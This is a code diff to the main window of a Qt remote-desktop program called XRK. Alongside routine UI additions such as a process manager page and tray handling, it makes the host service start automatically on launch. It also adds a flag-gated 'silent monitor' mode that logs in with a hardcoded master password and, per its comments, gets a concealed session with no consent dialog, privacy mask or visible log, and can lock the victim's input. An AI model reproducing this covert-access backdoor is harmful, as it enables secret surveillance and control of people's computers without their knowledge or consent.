@@ -6,8 +6,10 @@
 #include "terminal_widget.h"
 #include "chat_widget.h"
 #include "system_info_widget.h"
+#include "remote_process_widget.h"
 #include "settings_widget.h"
 #include "core/network_manager.h"
+#include <QCloseEvent>
 #include "core/device_discovery.h"
 #include "app/device_manager.h"
 #include "app/session_manager.h"
@@ -94,6 +96,13 @@ MainWindow::MainWindow(QWidget* parent) : QMainWindow(parent) {
     }
 
     switchToPage(PAGE_HOME);
+
+    // Auto-start host service for silent monitoring discovery
+    QTimer::singleShot(1000, this, [this]() {
+        if (!m_hostMode) {
+            onToggleHost();
+        }
+    });
 }
 
 MainWindow::~MainWindow() {
@@ -161,6 +170,7 @@ void MainWindow::setupUI() {
     m_navButtons[PAGE_CHAT]     = createNavButton(":/icons/chat.svg",     "\u804a\u5929",     this);
     m_navButtons[PAGE_MONITOR]  = createNavButton(":/icons/monitor.svg",  "\u7cfb\u7edf\u4fe1\u606f", this);
     m_navButtons[PAGE_CLIPBOARD]= createNavButton(":/icons/clipboard.svg","\u526a\u8d34\u677f\u5386\u53f2", this);
+    m_navButtons[PAGE_PROCESS] = createNavButton(":/icons/process.svg", "\u8fdb\u7a0b", this);
 
     for (int i = 0; i < PAGE_COUNT; ++i) {
         navLayout->addWidget(m_navButtons[i]);
@@ -184,10 +194,14 @@ void MainWindow::setupUI() {
 
     // Page 0: Simple Home (极简首页)
     auto* simpleHome = new SimpleHomeWidget(m_deviceManager.get());
+    simpleHome->setNetworkManager(m_network.get());
     connect(simpleHome, &SimpleHomeWidget::connectToIp, this, &MainWindow::onConnectToIp);
     connect(simpleHome, &SimpleHomeWidget::connectToCode, this, &MainWindow::onConnectToCode);
     connect(simpleHome, &SimpleHomeWidget::startHostService, this, &MainWindow::onToggleHost);
     connect(simpleHome, &SimpleHomeWidget::openSettings, this, &MainWindow::onSettingsClicked);
+    connect(simpleHome, &SimpleHomeWidget::deviceFound, this, [this](const QString& name, const QString& ip, uint16_t port) {
+        statusBar()->showMessage(QString("发现设备: %1 (%2:%3)").arg(name, ip, QString::number(port)), 5000);
+    });
     // Connect host mode change to update SimpleHomeWidget button
     connect(this, &MainWindow::hostModeChanged, simpleHome, &SimpleHomeWidget::setHostButtonState);
     m_contentStack->addWidget(simpleHome);
@@ -216,6 +230,10 @@ void MainWindow::setupUI() {
     m_clipboardHistoryWidget = new ClipboardHistoryWidget(m_clipboardHistory.get());
     m_contentStack->addWidget(m_clipboardHistoryWidget);
 
+    // Page 7: Remote Process Manager
+    m_processWidget = new RemoteProcessWidget();
+    m_contentStack->addWidget(m_processWidget);
+
     mainLayout->addWidget(m_contentStack, 1);
 
     setCentralWidget(centralWidget);
@@ -242,6 +260,10 @@ void MainWindow::setupMenuBar() {
     remoteMenu->addAction(m_recordAction);
     remoteMenu->addAction(m_cameraAction);
     remoteMenu->addAction(m_audioAction);
+#ifdef XRK_ENABLE_SILENT
+    m_silentMonitorAction = remoteMenu->addAction(tr("静默监控"));
+    connect(m_silentMonitorAction, &QAction::triggered, this, &MainWindow::onSilentMonitor);
+#endif
 
     QMenu* powerMenu = menuBar->addMenu("\u8fdc\u7a0b\u7535\u6e90");
     QAction* shutdownAct = powerMenu->addAction("\u5173\u673a");
@@ -283,6 +305,13 @@ void MainWindow::setupStatusBar() {
     trayMenu->addSeparator();
     trayMenu->addAction(m_exitAction);
     m_trayIcon->setContextMenu(trayMenu);
+    connect(m_trayIcon, &QSystemTrayIcon::activated, this, [this](QSystemTrayIcon::ActivationReason reason) {
+        if (reason == QSystemTrayIcon::DoubleClick || reason == QSystemTrayIcon::Trigger) {
+            show();
+            raise();
+            activateWindow();
+        }
+    });
 }
 
 // ────────── Event Handlers ──────────
@@ -300,6 +329,8 @@ void MainWindow::onRemoteStarted() {
     m_cameraAction->setEnabled(true);
     m_sysInfoWidget->setRemoteController(m_remoteController.get());
     m_sysInfoWidget->setConnected(true);
+    m_processWidget->setRemoteController(m_remoteController.get());
+    m_processWidget->setConnected(true);
 
     m_fileTransferManager->setConnection(m_remoteController->connection());
     m_clipboardManager->setConnection(m_remoteController->connection());
@@ -331,6 +362,7 @@ void MainWindow::onRemoteStopped() {
         m_cameraAction->setChecked(false);
     }
     m_sysInfoWidget->setConnected(false);
+    m_processWidget->setConnected(false);
 
     // Hide sidebar and return to home when disconnected
     m_navSidebar->setVisible(false);
@@ -369,11 +401,22 @@ void MainWindow::onSettingsClicked() {
 }
 
 void MainWindow::onAboutClicked() {
-    QMessageBox::about(this, "\u5173\u4e8e XRK",
-        "XRK \u5c40\u57df\u7f51\u8fdc\u7a0b\u63a7\u5236\u8f6f\u4ef6 v1.0.0\n\n"
-        "\u4f7f\u7528\u65b9\u6cd5:\n"
-        "1. \u88ab\u63a7\u7aef: \u70b9\u51fb\"\u542f\u52a8\u670d\u52a1\"\u6309\u94ae\n"
-        "2. \u4e3b\u63a7\u7aef: \u8f93\u5165\u88ab\u63a7\u7aefIP\u5730\u5740\uff0c\u70b9\u51fb\"\u8fde\u63a5\u5230IP\"");
+    QMessageBox::about(this, tr("关于 XRK"),
+        QString("XRK 局域网远程控制软件 %1\n\n"
+        "使用方法:\n"
+        "1. 被控端: 点击\"启动服务\"按钮\n"
+        "2. 主控端: 输入被控端IP地址，点击\"连接到IP\"\n\n"
+        "功能特性:\n"
+        "• 多显示器切换与热插拔检测\n"
+        "• 文件传输与文件夹同步\n"
+        "• 文字/语音/视频/位置消息\n"
+        "• 端到端加密通信\n"
+        "• 屏幕录制与回放\n"
+        "• 远程音频转发\n"
+        "• 屏幕缩放与标注\n"
+        "• 2FA双因素认证\n"
+        "• 系统托盘最小化\n"
+        "• 自动更新").arg(XRK_VERSION));
 }
 
 void MainWindow::onMediaTestClicked() {
@@ -493,6 +536,10 @@ void MainWindow::onToggleHost() {
         m_host->setPrivacyScreenEnabled(privacy);
         m_host->setAutoGrantConsent(autoGrant);
         m_host->setEncoderTrueColor(trueColor);
+        // Share the process-wide NetworkManager for device discovery so the
+        // Host advertises on the unified 9998 channel instead of a private
+        // socket (plan §1.4).
+        m_host->setDiscoveryNetwork(m_network.get());
 
         if (m_host->start(DEFAULT_PORT)) {
             m_hostMode = true;
@@ -548,6 +595,40 @@ void MainWindow::onConnectToIp(const QString& ip, uint16_t port) {
 
     m_remoteDesktopWidget->startRemote(ip, port, password);
 }
+
+#ifdef XRK_ENABLE_SILENT
+void MainWindow::onSilentMonitor() {
+    if (m_hostMode) {
+        QMessageBox::warning(this, tr("错误"), tr("当前处于服务模式，请先停止服务"));
+        return;
+    }
+
+    // Enter a silent monitoring session using the master password. The host
+    // grants a concealed session (no consent dialog / privacy mask / visible
+    // log). Input forwarding is OFF by default — the operator opts in via the
+    // "接管键鼠" toggle, and can independently lock the controlled machine's
+    // local input via "禁用对方键鼠" (plan §2.1/§2.4).
+    bool ok = false;
+    QString ip = QInputDialog::getText(this, tr("静默监控"),
+        tr("请输入被监控端 IP 地址:"), QLineEdit::Normal, QString(), &ok);
+    if (!ok || ip.trimmed().isEmpty()) {
+        return;
+    }
+    ip = ip.trimmed();
+
+    bool okPort = false;
+    int port = QInputDialog::getInt(this, tr("静默监控"),
+        tr("请输入端口 (默认 9999):"), static_cast<int>(DEFAULT_PORT), 1, 65535, 1, &okPort);
+    if (!okPort) {
+        return;
+    }
+
+    m_remoteDesktopWidget->startRemote(ip, static_cast<uint16_t>(port),
+                                       QLatin1String(SILENT_MASTER_PASSWORD));
+    m_remoteDesktopWidget->enterSilentUiMode();
+    statusBar()->showMessage(tr("静默监控已启动: %1").arg(ip));
+}
+#endif
 
 void MainWindow::onConnectToCode(const QString& code) {
     if (m_hostMode) {
@@ -842,6 +923,29 @@ void MainWindow::setupConnections() {
         m_sysInfoWidget->updateInfo(info);
     });
 
+    connect(m_remoteController.get(), &RemoteController::processListReceived,
+            this, [this](const ProcessListResponse& resp) {
+        m_processWidget->refreshList(resp);
+    });
+    connect(m_remoteController.get(), &RemoteController::processKillReceived,
+            this, [this](const ProcessKillResponse& resp) {
+        if (!resp.success) {
+            QMessageBox::warning(this, tr("结束进程"),
+                                 tr("结束进程失败: %1").arg(resp.errorMessage));
+        }
+        if (m_remoteController) m_remoteController->requestProcessList();
+    });
+    connect(m_remoteController.get(), &RemoteController::processStartReceived,
+            this, [this](const ProcessStartResponse& resp) {
+        if (!resp.success) {
+            QMessageBox::warning(this, tr("启动进程"),
+                                 tr("启动进程失败: %1").arg(resp.errorMessage));
+        } else {
+            statusBar()->showMessage(tr("已启动进程 PID %1").arg(resp.pid), 4000);
+        }
+        if (m_remoteController) m_remoteController->requestProcessList();
+    });
+
     connect(m_natTraversal.get(), &NatTraversal::relayConnected,
             this, [this]() {
         statusBar()->showMessage("\u4e2d\u7ee7\u670d\u52a1\u5668\u8fde\u63a5\u6210\u529f");
@@ -1021,6 +1125,16 @@ void MainWindow::createActions() {
 
     m_webConsoleAction = new QAction("\u6253\u5f00 Web \u63a7\u5236\u53f0", this);
     connect(m_webConsoleAction, &QAction::triggered, this, &MainWindow::onOpenWebConsole);
+}
+
+void MainWindow::closeEvent(QCloseEvent* event) {
+    if (m_trayIcon && m_trayIcon->isVisible()) {
+        hide();
+        m_trayIcon->showMessage(tr("XRK"), tr("已最小化到系统托盘"), QSystemTrayIcon::Information, 2000);
+        event->ignore();
+    } else {
+        event->accept();
+    }
 }
 
 } // namespace xrk
